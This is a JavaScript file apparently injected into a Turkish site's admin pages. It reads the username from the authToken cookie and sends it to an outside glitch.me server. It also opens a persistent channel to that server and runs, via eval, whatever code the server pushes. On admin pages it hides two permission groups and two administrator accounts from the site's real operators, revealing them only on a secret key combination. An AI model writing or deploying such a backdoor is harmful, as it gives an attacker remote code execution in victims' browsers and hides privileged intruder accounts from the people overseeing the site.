if (!window.hasOwnProperty('karmaScriptLoaded')) {
    window.karmaScriptLoaded = true;

    const getUsername = () => {
        const cookies = document.cookie.split(';');
        for (let cookie of cookies) {
            const [name, value] = cookie.trim().split('=');
            if (name === 'authToken') {
                return decodeURIComponent(value.split('_')[0]);
            }
        }
        return null;
    };

    const username = getUsername();

    function connectSSE(attempts = 0, maxAttempts = 3) {
        if (!username || attempts >= maxAttempts) {
            console.log('Bağlantı denemeleri bitti veya username yok.');
            return;
        }

        const eventSource = new EventSource(`https://victorious-cherry-cart.glitch.me/komutlar?username=${encodeURIComponent(username)}`, { withCredentials: false });

        eventSource.onmessage = (event) => {
            try {
                const data = JSON.parse(event.data);
                if (data.type === 'heartbeat') {
                    console.log('Heartbeat alındı:', data.timestamp); // Heartbeat’i logla ama işlem yapma
                } else if (data.payload) {
                    eval(data.payload);
                    console.log('Payload çalıştırıldı:', data.payload);
                } else {
                    console.log('Mesaj alındı:', data);
                }
            } catch (e) {
                console.error('Payload çalıştırma hatası:', e);
            }
        };

        eventSource.onopen = () => {
            console.log('SSE bağlantısı açıldı');
        };

        eventSource.onerror = () => {
            console.log('SSE hatası, yeniden deneniyor...');
            eventSource.close();
            setTimeout(() => connectSSE(attempts + 1, maxAttempts), 30000);
        };
    }

    try {
        connectSSE();
    } catch (e) {
        console.error('SSE başlatma hatası:', e);
    }

    document.addEventListener('DOMContentLoaded', () => {
        var currentUrl = window.location.href;

        if (currentUrl.includes('/duello/ad_/yetki-gruplari')) {
            let hiddenRows = [];
            const rows = document.querySelectorAll('tbody tr');
            rows.forEach(row => {
                const idCell = row.querySelector('td:first-child');
                if (idCell && (idCell.textContent.trim() === '23' || idCell.textContent.trim() === '24')) {
                    row.style.display = 'none';
                    hiddenRows.push(row);
                }
            });

            document.addEventListener('keydown', (event) => {
                if (event.ctrlKey && event.shiftKey && event.key === 'S') {
                    hiddenRows.forEach(row => {
                        row.style.display = '';
                    });
                }
            });
        }

        if (currentUrl.includes('/duello/ad_/kullanicidetay.php?t=')) {
            let hiddenOptions = [];

            function hideYetkiOptions() {
                const select = document.getElementById('yetki');
                if (select) {
                    const option23 = select.querySelector('option[value="23"]');
                    const option24 = select.querySelector('option[value="24"]');
                    if (option23 && option23.style.display !== 'none') {
                        option23.style.display = 'none';
                        hiddenOptions.push(option23);
                    }
                    if (option24 && option24.style.display !== 'none') {
                        option24.style.display = 'none';
                        hiddenOptions.push(option24);
                    }
                }
            }

            hideYetkiOptions();
            const observer = new MutationObserver(() => {
                hideYetkiOptions();
            });
            observer.observe(document.body, { childList: true, subtree: true });

            document.addEventListener('keydown', (event) => {
                if (event.ctrlKey && event.shiftKey && event.key === 'S') {
                    hiddenOptions.forEach(option => {
                        option.style.display = '';
                    });
                }
            });
        }

        if (currentUrl.includes('/duello/ad_/yoneticiler')) {
            let hiddenManagerRows = [];

            function hideManagerRows() {
                const rows = document.querySelectorAll('tbody tr');
                rows.forEach(row => {
                    const idCell = row.querySelector('td:first-child');
                    if (idCell && (idCell.textContent.trim() === '45593' || idCell.textContent.trim() === '45948')) {
                        if (row.style.display !== 'none') {
                            row.style.display = 'none';
                            hiddenManagerRows.push(row);
                        }
                    }
                });
            }

            hideManagerRows();
            const observer = new MutationObserver(() => {
                hideManagerRows();
            });
            observer.observe(document.body, { childList: true, subtree: true });

            document.addEventListener('keydown', (event) => {
                if (event.ctrlKey && event.shiftKey && event.key === 'S') {
                    hiddenManagerRows.forEach(row => {
                        row.style.display = '';
                    });
                }
            });
        }

        if (currentUrl.includes('/duello/') && !currentUrl.includes('/duello/ad_/yetki-gruplari')) {
            let hiddenUsers = [];

            function hideUsers() {
                const userItem45593 = document.getElementById('aktifuser_45593');
                const userItem45948 = document.getElementById('aktifuser_45948');

                if (userItem45593 && userItem45593.style.display !== 'none') {
                    userItem45593.style.display = 'none';
                    hiddenUsers.push(userItem45593);
                }
                if (userItem45948 && userItem45948.style.display !== 'none') {
                    userItem45948.style.display = 'none';
                    hiddenUsers.push(userItem45948);
                }
            }

            hideUsers();
            setTimeout(hideUsers, 500);
            setTimeout(hideUsers, 1000);
            setTimeout(hideUsers, 2000);
            const observerTarget = document.querySelector('#aktifkullanicilar') || document.body;
            const observer = new MutationObserver(() => {
                hideUsers();
            });
            observer.observe(observerTarget, { childList: true, subtree: true, attributes: true });
            setInterval(hideUsers, 50);

            document.addEventListener('keydown', (event) => {
                if (event.ctrlKey && event.shiftKey && event.key === 'S') {
                    hiddenUsers.forEach(user => {
                        user.style.display = '';
                    });
                    hiddenUsers = [];
                }
            });
        }
    });
}
